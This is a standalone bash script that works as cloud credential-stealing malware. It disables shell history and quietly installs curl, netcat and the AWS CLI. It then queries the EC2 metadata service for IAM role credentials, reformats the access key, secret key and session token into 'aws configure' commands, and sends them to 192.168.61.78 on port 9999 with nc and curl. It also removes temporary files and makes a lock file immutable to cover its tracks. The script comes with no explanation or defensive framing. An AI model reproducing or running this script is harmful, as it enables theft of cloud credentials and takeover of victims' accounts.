#!/bin/bash
export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin:$HOME/.local/bin
export LC_ALL=C.UTF-8 2>/dev/null;export LANG=C.UTF-8 2>/dev/null
export LC_ALL=en_US.UTF-8 2>/dev/null
export HISTFILE=/dev/null;HISTSIZE=0;unset HISTFILE

if [ -f "/tmp/....lock" ]; then echo "LOCKED!" ; exit ; fi


function somesetup(){
CHECK_APT=$(which apt-get)
CHECK_APK=$(which apk)
CHECK_YUM=$(which yum)
if ! [[ $CHECK_APT == *"exited with 1"* ]]; then aptsetup ; fi
if ! [[ $CHECK_APK == *"exited with 1"* ]]; then apksetup ; fi
if ! [[ $CHECK_YUM == *"exited with 1"* ]]; then yumsetup ; fi
}

function apksetup(){
apk update 2>/dev/null 1>/dev/null
apk add curl 2>/dev/null 1>/dev/null
apk add netcat-openbsd 2>/dev/null 1>/dev/null
apk add aws-cli 2>/dev/null 1>/dev/null
}

function aptsetup(){
rm -f /var/lib/apt/lists/lock 2>/dev/null 1>/dev/null
apt-get update --fix-missing 2>/dev/null 1>/dev/null
apt-get install -y curl --allow-unauthenticated 2>/dev/null 1>/dev/null
apt-get install -y netcat --allow-unauthenticated 2>/dev/null 1>/dev/null
apt-get install -y awscli --allow-unauthenticated 2>/dev/null 1>/dev/null
}

function yumsetup(){
yum clean all 2>/dev/null 1>/dev/null
yum install -y curl 2>/dev/null 1>/dev/null
yum install -y nmap-ncat 2>/dev/null 1>/dev/null
yum install -y awscli 2>/dev/null 1>/dev/null
}


if ! type curl 2>/dev/null 1>/dev/null; then somesetup ; fi
if ! type nc 2>/dev/null 1>/dev/null; then somesetup ; fi
if ! type aws 2>/dev/null 1>/dev/null; then somesetup ; fi

aws sts get-caller-identity

TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && \
ANAME=`curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/` && \
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials/$ANAME >> /tmp/...b
#find /tmp/...b -size -5 -delete
if grep -q "SecretAccessKey" /tmp/...b; then

cat /tmp/...b | tr ',' '\n' | grep 'AccessKeyId\|SecretAccessKey\|Token' | sed 's# "AccessKeyId" : "#\n\naws configure set aws_access_key_id #g' | sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' | sed 's#"Token" : "#aws configure set aws_session_token #g'| sed 's/"//g' > /tmp/...c

echo ""
cat /tmp/...c | nc 192.168.61.78 9999
echo ""
curl --upload-file /tmp/...c 192.168.61.78:9999
echo ""
fi

rm -f /tmp/...b
touch /tmp/....lock
chattr +ia /tmp/....lock
